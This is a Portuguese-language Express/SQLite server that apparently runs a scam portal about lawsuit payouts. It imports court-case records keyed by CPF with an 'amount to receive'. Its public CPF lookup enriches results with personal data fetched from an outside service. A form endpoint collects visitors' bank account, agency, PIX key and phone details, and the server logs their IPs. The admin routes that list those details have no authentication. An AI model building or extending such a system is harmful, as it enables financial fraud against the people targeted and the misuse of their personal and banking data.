import express from 'express';
import cors from 'cors';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const db = new Database(join(__dirname, 'database.db'));

// Tabela de acessos
db.exec(`
  CREATE TABLE IF NOT EXISTS acessos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    cpf_consultado TEXT,
    dispositivo TEXT,
    navegador TEXT,
    pais TEXT,
    cidade TEXT,
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

db.exec(`
  CREATE TABLE IF NOT EXISTS processos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nome TEXT NOT NULL,
    cpf TEXT NOT NULL,
    numero_processo TEXT NOT NULL,
    advogado TEXT NOT NULL DEFAULT '',
    valor_receber REAL NOT NULL DEFAULT 0,
    valor_pendente REAL NOT NULL DEFAULT 0,
    status TEXT NOT NULL DEFAULT 'Em andamento',
    polo_ativo TEXT DEFAULT '',
    polo_passivo TEXT DEFAULT '',
    cnpj_reu TEXT DEFAULT '',
    vara TEXT DEFAULT '',
    comarca TEXT DEFAULT '',
    classe TEXT DEFAULT '',
    assunto TEXT DEFAULT '',
    jurisdicao TEXT DEFAULT '',
    orgao_julgador TEXT DEFAULT '',
    valor_causa TEXT DEFAULT '',
    autuacao TEXT DEFAULT '',
    segredo_justica TEXT DEFAULT 'NÃO',
    justica_gratuita TEXT DEFAULT 'NÃO',
    tutela_liminar TEXT DEFAULT 'NÃO',
    prioridade TEXT DEFAULT 'NÃO',
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP,
    atualizado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Adicionar colunas se não existirem
try { db.exec("ALTER TABLE processos ADD COLUMN polo_ativo TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN polo_passivo TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN cnpj_reu TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN vara TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN comarca TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN classe TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN assunto TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN jurisdicao TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN orgao_julgador TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN valor_causa TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN autuacao TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN segredo_justica TEXT DEFAULT 'NÃO'"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN justica_gratuita TEXT DEFAULT 'NÃO'"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN tutela_liminar TEXT DEFAULT 'NÃO'"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN prioridade TEXT DEFAULT 'NÃO'"); } catch {}

app.get('/api/processos', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const search = req.query.search || '';
  const orderBy = req.query.orderBy || 'dados_primeiro';
  const filterDados = req.query.filterDados || '';
  const offset = (page - 1) * limit;

  // Subquery para verificar se tem dados enviados
  const dadosSubquery = `(SELECT COUNT(*) FROM prosseguimentos WHERE REPLACE(REPLACE(REPLACE(prosseguimentos.cpf, '.', ''), '-', ''), ' ', '') = REPLACE(REPLACE(REPLACE(processos.cpf, '.', ''), '-', ''), ' ', ''))`;

  let conditions = [];
  let params = [];

  if (search) {
    conditions.push(`(nome LIKE ? OR cpf LIKE ? OR numero_processo LIKE ? OR polo_ativo LIKE ? OR polo_passivo LIKE ?)`);
    const searchPattern = `%${search}%`;
    params.push(searchPattern, searchPattern, searchPattern, searchPattern, searchPattern);
  }

  if (filterDados === 'com_dados') {
    conditions.push(`${dadosSubquery} > 0`);
  } else if (filterDados === 'sem_dados') {
    conditions.push(`${dadosSubquery} = 0`);
  }

  const whereClause = conditions.length > 0 ? `WHERE ${conditions.join(' AND ')}` : '';

  // Ordenação
  let orderClause;
  switch (orderBy) {
    case 'dados_primeiro':
      orderClause = `ORDER BY ${dadosSubquery} DESC, criado_em DESC`;
      break;
    case 'recente':
      orderClause = 'ORDER BY criado_em DESC';
      break;
    case 'antigo':
      orderClause = 'ORDER BY criado_em ASC';
      break;
    case 'nome_az':
      orderClause = 'ORDER BY nome ASC';
      break;
    case 'nome_za':
      orderClause = 'ORDER BY nome DESC';
      break;
    case 'valor_maior':
      orderClause = 'ORDER BY valor_receber DESC';
      break;
    case 'valor_menor':
      orderClause = 'ORDER BY valor_receber ASC';
      break;
    default:
      orderClause = `ORDER BY ${dadosSubquery} DESC, criado_em DESC`;
  }

  const countQuery = `SELECT COUNT(*) as total FROM processos ${whereClause}`;
  const total = db.prepare(countQuery).get(...params).total;

  const dataQuery = `SELECT processos.*, ${dadosSubquery} as tem_dados FROM processos ${whereClause} ${orderClause} LIMIT ? OFFSET ?`;
  const processos = db.prepare(dataQuery).all(...params, limit, offset);

  res.json({
    data: processos,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit)
    }
  });
});

app.post('/api/processos', (req, res) => {
  const { nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, vara, comarca, classe, assunto } = req.body;

  if (!nome || !cpf || !numero_processo || !advogado) {
    return res.status(400).json({ error: 'Campos obrigatórios não preenchidos' });
  }

  const stmt = db.prepare(`
    INSERT INTO processos (nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, vara, comarca, classe, assunto)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  const result = stmt.run(nome, cpf, numero_processo, advogado, valor_receber || 0, valor_pendente || 0, status || 'Em andamento', polo_ativo || '', polo_passivo || '', vara || '', comarca || '', classe || '', assunto || '');
  const processo = db.prepare('SELECT * FROM processos WHERE id = ?').get(result.lastInsertRowid);
  res.status(201).json(processo);
});

app.put('/api/processos/:id', (req, res) => {
  const { id } = req.params;
  const { nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, vara, comarca, classe, assunto } = req.body;

  const stmt = db.prepare(`
    UPDATE processos SET nome = ?, cpf = ?, numero_processo = ?, advogado = ?, valor_receber = ?, valor_pendente = ?, status = ?, polo_ativo = ?, polo_passivo = ?, vara = ?, comarca = ?, classe = ?, assunto = ?, atualizado_em = CURRENT_TIMESTAMP
    WHERE id = ?
  `);

  stmt.run(nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo || '', polo_passivo || '', vara || '', comarca || '', classe || '', assunto || '', id);
  const processo = db.prepare('SELECT * FROM processos WHERE id = ?').get(id);
  res.json(processo);
});

app.delete('/api/processos/:id', (req, res) => {
  db.prepare('DELETE FROM processos WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

app.get('/api/consulta/:cpf', async (req, res) => {
  const cpf = req.params.cpf.replace(/\D/g, '');
  const processos = db.prepare("SELECT * FROM processos WHERE REPLACE(REPLACE(REPLACE(cpf, '.', ''), '-', ''), ' ', '') = ?").all(cpf);

  if (processos.length === 0) {
    return res.status(404).json({ error: 'Nenhum processo encontrado para este CPF' });
  }

  const prosseguimentos = db.prepare("SELECT processo_id, cpf, cpf_titular FROM prosseguimentos WHERE REPLACE(REPLACE(REPLACE(cpf, '.', ''), '-', ''), ' ', '') = ? OR REPLACE(REPLACE(REPLACE(cpf_titular, '.', ''), '-', ''), ' ', '') = ?").all(cpf, cpf);

  const processosComStatus = processos.map(p => ({
    ...p,
    dados_enviados: prosseguimentos.some(pr => pr.processo_id === p.id || pr.cpf === cpf || pr.cpf_titular?.replace(/\D/g, '') === cpf)
  }));

  let dadosPessoais = null;
  try {
    const apiRes = await fetch(`https://mktsuporte.com.br/apifull.php?cpf=${cpf}`);
    if (apiRes.ok) {
      dadosPessoais = await apiRes.json();
    }
  } catch (err) {
    console.log('Erro ao buscar dados pessoais:', err.message);
  }

  res.json({ processos: processosComStatus, dadosPessoais });
});

db.exec(`
  CREATE TABLE IF NOT EXISTS prosseguimentos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    processo_id INTEGER,
    cpf TEXT NOT NULL,
    telefone TEXT NOT NULL,
    banco TEXT NOT NULL,
    agencia TEXT NOT NULL,
    conta TEXT NOT NULL,
    tipo_conta TEXT NOT NULL DEFAULT 'corrente',
    titular TEXT NOT NULL DEFAULT '',
    cpf_titular TEXT NOT NULL DEFAULT '',
    chave_pix TEXT DEFAULT '',
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

app.post('/api/prosseguimento', (req, res) => {
  const { processo_id, cpf, telefone, banco, agencia, conta, tipo_conta, titular, cpf_titular, chave_pix } = req.body;

  if (!cpf || !telefone || !banco || !agencia || !conta || !tipo_conta || !titular || !cpf_titular) {
    res.status(400).json({ error: 'Campos obrigatórios não preenchidos' });
    return;
  }

  const stmt = db.prepare(`
    INSERT INTO prosseguimentos (processo_id, cpf, telefone, banco, agencia, conta, tipo_conta, titular, cpf_titular, chave_pix)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  stmt.run(processo_id || null, cpf, telefone, banco, agencia, conta, tipo_conta, titular, cpf_titular, chave_pix || '');
  res.status(201).json({ success: true });
});

app.get('/api/prosseguimentos', (req, res) => {
  const rows = db.prepare('SELECT * FROM prosseguimentos ORDER BY criado_em DESC').all();
  res.json(rows);
});

app.delete('/api/prosseguimentos/:id', (req, res) => {
  db.prepare('DELETE FROM prosseguimentos WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// Registrar acesso
app.post('/api/acesso', (req, res) => {
  const { cpf_consultado, dispositivo, navegador } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Desconhecido';

  const stmt = db.prepare(`
    INSERT INTO acessos (ip, cpf_consultado, dispositivo, navegador, pais, cidade)
    VALUES (?, ?, ?, ?, ?, ?)
  `);

  stmt.run(ip, cpf_consultado || '', dispositivo || 'Desconhecido', navegador || 'Desconhecido', 'Brasil', '');
  res.json({ success: true });
});

// Listar acessos com paginação
app.get('/api/acessos', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const offset = (page - 1) * limit;

  const total = db.prepare('SELECT COUNT(*) as total FROM acessos').get().total;
  const acessos = db.prepare('SELECT * FROM acessos ORDER BY criado_em DESC LIMIT ? OFFSET ?').all(limit, offset);

  res.json({
    data: acessos,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit)
    }
  });
});

// Estatísticas de acessos
app.get('/api/acessos/stats', (req, res) => {
  const total = db.prepare('SELECT COUNT(*) as total FROM acessos').get().total;
  const hoje = db.prepare("SELECT COUNT(*) as total FROM acessos WHERE DATE(criado_em) = DATE('now')").get().total;
  const dispositivos = db.prepare('SELECT dispositivo, COUNT(*) as count FROM acessos GROUP BY dispositivo ORDER BY count DESC LIMIT 5').all();

  res.json({ total, hoje, dispositivos });
});

// Importar processos de JSON
app.post('/api/importar', (req, res) => {
  const { processos } = req.body;

  if (!processos || !Array.isArray(processos)) {
    return res.status(400).json({ error: 'Formato inválido. Esperado array de processos.' });
  }

  const stmt = db.prepare(`
    INSERT INTO processos (nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, cnpj_reu, vara, comarca, classe, assunto, jurisdicao, orgao_julgador, valor_causa, autuacao, segredo_justica, justica_gratuita, tutela_liminar, prioridade)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  let importados = 0;
  let erros = 0;

  for (const p of processos) {
    try {
      // Limpar nome do autor (remover "Polo ativo" e " -")
      const nomeAutor = (p.nome_autor || '').replace(/^Polo ativo/i, '').replace(/ -$/, '').trim();
      const nomeReu = (p.nome_reu || '').replace(/^Polo passivo/i, '').replace(/ -$/, '').trim();

      // Extrair valor numérico do valor_causa
      const valorCausaNum = parseFloat((p.valor_causa || '0').replace(/[^\d,]/g, '').replace(',', '.')) || 0;

      // Assuntos como string
      const assuntos = Array.isArray(p.assuntos) ? p.assuntos.join(', ') : (p.assunto || '');

      // Polo ativo/passivo do processo_original se existir
      const poloAtivo = p.processo_original?.polo_ativo || nomeAutor;
      const poloPassivo = p.processo_original?.polo_passivo || nomeReu;

      stmt.run(
        nomeAutor,                                    // nome
        (p.cpf_autor || '').replace(/\D/g, ''),       // cpf
        p.numero_processo || '',                      // numero_processo
        '',                                           // advogado
        valorCausaNum,                                // valor_receber
        0,                                            // valor_pendente
        'Em andamento',                               // status
        poloAtivo,                                    // polo_ativo
        poloPassivo,                                  // polo_passivo
        p.cnpj_reu || '',                             // cnpj_reu
        p.orgao_julgador || '',                       // vara (usando orgao_julgador)
        p.jurisdicao || '',                           // comarca (usando jurisdicao)
        p.classe_judicial || p.processo_original?.classe || '', // classe
        assuntos,                                     // assunto
        p.jurisdicao || '',                           // jurisdicao
        p.orgao_julgador || '',                       // orgao_julgador
        p.valor_causa || '',                          // valor_causa (texto original)
        p.autuacao || '',                             // autuacao
        p.segredo_justica || 'NÃO',                   // segredo_justica
        p.justica_gratuita || 'NÃO',                  // justica_gratuita
        p.tutela_liminar || 'NÃO',                    // tutela_liminar
        p.prioridade || 'NÃO'                         // prioridade
      );
      importados++;
    } catch (err) {
      console.error('Erro ao importar processo:', err.message);
      erros++;
    }
  }

  res.json({ success: true, importados, erros, total: processos.length });
});

// Servir arquivos estáticos do build em produção
app.use(express.static(join(__dirname, '../dist')));

// Fallback para SPA (Express 5 syntax)
app.get('/{*splat}', (req, res) => {
  res.sendFile(join(__dirname, '../dist/index.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
